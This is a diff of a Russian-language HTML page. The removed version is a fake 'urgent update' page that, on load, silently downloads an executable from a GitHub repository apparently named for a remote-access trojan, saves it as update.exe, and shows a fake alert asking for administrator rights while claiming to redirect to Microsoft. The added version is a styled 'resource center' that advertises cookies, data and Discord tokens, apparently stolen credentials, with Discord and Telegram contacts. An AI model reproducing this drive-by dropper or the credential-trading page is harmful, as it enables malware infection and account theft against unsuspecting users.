@@ -1,23 +1,164 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Деревенский ресурс</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+            cursor: none;
+        }
+        .cursor {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 0 15px #fff, 0 0 30px #fff;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            transition: transform 0.2s;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            animation: fadeIn 2s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            animation: glow 2s infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 5px #fff; }
+            to { text-shadow: 0 0 20px #fff, 0 0 30px #fff; }
+        }
+        .slot {
+            background-color: #111;
+            border: 1px solid #333;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 10px;
+            animation: pulse 3s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 5px rgba(255,255,255,0.3); }
+            50% { box-shadow: 0 0 20px rgba(255,255,255,0.7); }
+            100% { box-shadow: 0 0 5px rgba(255,255,255,0.3); }
+        }
+        .discord-btn {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1.2em;
+            transition: transform 0.3s;
+        }
+        .discord-btn:hover {
+            transform: scale(1.1);
+        }
+        .discord-menu {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 100;
+            border: 1px solid #444;
+        }
+        .copy-circle {
+            width: 100px;
+            height: 100px;
+            background: #5865F2;
+            border-radius: 50%;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            animation: rotate 4s linear infinite;
+        }
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .contact {
+            margin-top: 40px;
+            font-size: 1.1em;
+        }
+        a {
+            color: #1e90ff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="cursor"></div>
+    <div class="container">
+        <h1>Ресурсный центр</h1>
+        
+        <div class="slot">
+            <h2>Куки, данные, Discord токены</h2>
+            <p>Загрузите или введите данные здесь.</p>
+        </div>
+        
+        <button class="discord-btn" onclick="openMenu()">Discord</button>
+        <div id="discordMenu" class="discord-menu">
+            <h3>Discord контакт</h3>
+            <p>Юзер: lovesharks_123</p>
+            <div class="copy-circle" onclick="copyText()">
+                <p>Копировать</p>
+            </div>
+            <button onclick="closeMenu()">Закрыть</button>
+        </div>
+        
+        <div class="contact">
+            <p>Связь со мной:</p>
+            <a href="https://t.me/+18482363637" target="_blank">Telegram</a>
+        </div>
+    </div>
 
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Срочное обновление</title>
-        <script>
-            window.onload = function() {
-                var link = document.createElement('a');
-                link.href = 'https://github.com/misswepenner/ZOV-RATKA/raw/main/nonagon.exe';
-                link.download = 'update.exe';
-                document.body.appendChild(link);
-                link.click();
-                setTimeout(() => {
-                    alert("Файл поврежден. Разрешите восстановление? (ТРЕБУЮТСЯ АДМИН-ПРАВА)");
-                }, 2000);
-            };
-        </script>
-    </head>
-    <body>
-        Перенаправление на сервер Microsoft...
-    </body>
-    </html>
-    
+    <script>
+        // Кастомный курсор
+        document.addEventListener('DOMContentLoaded', () => {
+            const cursor = document.querySelector('.cursor');
+            document.addEventListener('mousemove', (e) => {
+                cursor.style.left = e.pageX + 'px';
+                cursor.style.top = e.pageY + 'px';
+            });
+        });
+
+        // Discord меню
+        function openMenu() {
+            document.getElementById('discordMenu').style.display = 'block';
+        }
+        function closeMenu() {
+            document.getElementById('discordMenu').style.display = 'none';
+        }
+        function copyText() {
+            navigator.clipboard.writeText('lovesharks_123')
+                .then(() => alert('Текст скопирован!'))
+                .catch(err => console.error('Ошибка:', err));
+        }
+    </script>
+</body>
+</html>
